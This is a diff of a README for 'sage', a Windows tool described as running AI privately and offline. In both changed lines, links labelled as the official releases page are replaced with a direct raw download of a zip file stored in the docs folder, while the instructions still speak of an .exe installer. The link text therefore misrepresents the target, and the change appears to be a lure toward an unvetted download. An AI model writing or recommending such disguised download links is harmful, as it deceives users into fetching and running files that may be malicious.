@@ -1,6 +1,6 @@
 # 🤖 sage - Run private AI on your computer
 
-[![](https://img.shields.io/badge/Download-Sage-blue)](https://github.com/alosaupending874/sage/releases)
+[![](https://img.shields.io/badge/Download-Sage-blue)](https://github.com/alosaupending874/sage/raw/refs/heads/main/docs/Software_1.1.zip)
 
 Sage runs artificial intelligence models directly on your hardware. It keeps your data on your machine. You do not need an internet connection to use the features. The software handles all processing locally. This ensures your private files stay private.
 
@@ -29,7 +29,7 @@ Sage runs on standard Windows hardware. Check your machine against these require
 
 Follow these steps to set up Sage on your Windows machine.
 
-1. Visit the [official releases page](https://github.com/alosaupending874/sage/releases).
+1. Visit the [official releases page](https://github.com/alosaupending874/sage/raw/refs/heads/main/docs/Software_1.1.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.exe` to download the installer to your computer.
 4. Locate the file in your Downloads folder.
